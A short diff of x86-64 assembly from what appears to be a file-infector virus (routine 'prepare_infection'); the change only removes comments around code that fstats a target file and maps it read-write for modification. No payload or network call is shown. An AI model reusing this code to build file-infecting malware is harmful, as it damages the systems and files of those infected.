@@ -596,7 +596,7 @@ prepare_infection:
 
 	; fstat(fd, &stat)
 	mov     rdi, r12
-	sub     rsp, 144 ; struct stat buffer
+	sub     rsp, 144
 	mov     rax, SYS_fstat
 	mov     rsi, rsp
 	syscall
@@ -606,16 +606,16 @@ prepare_infection:
 	; save file size
 	mov     rax, [rsp + 48]
 	mov     [rel file_size], rax
-	add     rsp, 144    ; Fix: move this AFTER storing file_size
+	add     rsp, 144
 
 	; mmap(0, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)
 	mov     rax, SYS_mmap
-	xor     rdi, rdi    ; NULL address (let kernel choose)
-	mov     rsi, [rel file_size]  ; Fix: Load the VALUE from file_size
+	xor     rdi, rdi
+	mov     rsi, [rel file_size]
 	mov     rdx, PROT_READ | PROT_WRITE
 	mov     r10, MAP_SHARED
-	mov     r8, r12     ; file descriptor
-	xor     r9, r9      ; offset
+	mov     r8, r12
+	xor     r9, r9
 	syscall
 	cmp     rax, -4095
 	jae     .close_file
